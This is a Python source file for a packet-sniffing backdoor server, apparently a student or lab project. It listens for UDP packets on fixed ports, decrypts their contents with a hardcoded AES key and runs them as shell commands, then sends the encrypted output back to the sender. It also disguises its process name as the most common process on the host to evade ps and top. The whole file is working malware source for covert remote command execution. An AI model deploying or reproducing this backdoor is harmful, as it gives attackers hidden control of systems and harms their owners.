#!/usr/bin/python

#-----------------------------------------------------------------------------
#-- SOURCE FILE:    server.py -   Packet-Sniffing Backdoor
#--
#-- FUNCTIONS:      encrypt(data)
#--                 decrypt(data)
#--                 setProcessName(name)
#--                 maskProcess()
#--                 remoteExecute(pkt)
#--                 main()
#--
#-- DATE:           October 19, 2015
#--
#-- DESIGNERS:      Brij Shah
#--
#-- PROGRAMMERS:    Brij Shah
#--
#-- NOTES:
#-- Server listens for the client to send remote commands. Once it obtains
#-- the command, it decrypts the data, runs the command, and encrypts the
#-- output to send back. The server then creates a packet with the encrypted
#-- output and sends it back to the client.
#-----------------------------------------------------------------------------

import os, argparse, time, setproctitle, subprocess, logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from subprocess import *
from ctypes import cdll, byref, create_string_buffer
from Crypto.Cipher import AES
import base64

MASTER_KEY = "12345678901234567890123456789012"

#-----------------------------------------------------------------------------
#-- FUNCTION:       encrypt(data)
#--
#-- VARIABLES(S):   data - the data to be encrypted
#--
#-- NOTES:
#-- encrypt takes in the data to be encrypted and returns the encoded data
#-----------------------------------------------------------------------------
def encrypt(data):
    encryptionKey = AES.new(MASTER_KEY)
    tagString = (str(data) +
                  (AES.block_size -
                   len(str(data)) % AES.block_size) * "\0")
    ciphertext = base64.b64encode(encryptionKey.encrypt(tagString))
    return ciphertext

#-----------------------------------------------------------------------------
#-- FUNCTION:       decrypt(data)
#--
#-- VARIABLES(S):   data - the data to be encrypted
#--
#-- NOTES:
#--decrypt takes in encoded data and returns the plain text value
#-----------------------------------------------------------------------------
def decrypt(data):
    decryptionKey = AES.new(MASTER_KEY)
    rawData = decryptionKey.decrypt(base64.b64decode(data))
    plaintext = rawData.rstrip("\0")
    return plaintext

#-----------------------------------------------------------------------------
#-- FUNCTION:       setProcessName(name)
#--
#-- VARIABLES(S):   name - process name to be changed
#--
#-- NOTES:
#-- setProcessName uses 'prctl' to manipulate certain characteristics
#-- of a process. It takes in a name in which you want to assign to the
#-- scripts process and changes it within the buffer.
#-----------------------------------------------------------------------------
def setProcessName(name):
    libc = cdll.LoadLibrary('libc.so.6')
    buff = create_string_buffer(len(name) + 1)
    buff.value = name
    libc.prctl(15, byref(buff), 0, 0, 0)

#-----------------------------------------------------------------------------
#-- FUNCTION:       maskProcess()
#--
#-- NOTES:
#-- maskProcess obtains the most common process for both ps -aux and top and
#-- calls setProcessName to set the script process name to the most common
#-- process running on the system at the time.
#-----------------------------------------------------------------------------
def maskProcess():
    command = os.popen("ps -aux | awk '{ print $11 }' | sort | uniq -c | sort -n | tail -n1 | awk '{ print $2}'")
    commandResult = command.read()
    #print "Most common process for ps/htop: {0}".format(commandResult)
    setproctitle.setproctitle(commandResult)
    command = os.popen("top -bn1 | awk '{ print $12 }' | sort | uniq -c | sort -n | tail -n1 | awk '{ print $2}'")
    commandResult = command.read()
    setProcessName(commandResult)
    #print "Most common process for top: {0}".format(commandResult)

#-----------------------------------------------------------------------------
#-- FUNCTION:       remoteExecute(pkt)
#--
#-- VARIABLES(S):   pkt - packets being sniffed by backdoor
#--
#-- NOTES:
#-- remoteExecute is a callback function for the sniff filter. Once sniff
#-- picks up packets with the designated filter, remoteExecute will apply
#-- certain commands to each packet, in this case, each packet be decrypted
#-- to obtain the command. The command will be processed and the output will
#-- be encrypted to be sent back to the client.
#-----------------------------------------------------------------------------
def remoteExecute(pkt):
    plaintext = decrypt(pkt.load)
    command = subprocess.Popen(plaintext, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output = command.stdout.read() + command.stderr.read()

    if not output:
		output = 'no data'

    ciphertext = encrypt(output)
    pkt = IP(dst=pkt[0][1].src)/UDP(dport=7999, sport=8000)/Raw(load=ciphertext)
    time.sleep(0.1)
    send(pkt, verbose=0)

#-----------------------------------------------------------------------------
#-- FUNCTION:       main()
#--
#-- NOTES:
#-- The pseudomain method
#-----------------------------------------------------------------------------
def main():
    maskProcess()
    sniff(filter="udp and src port 7999 and dst port 8000", prn=remoteExecute)

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print 'Exiting..'
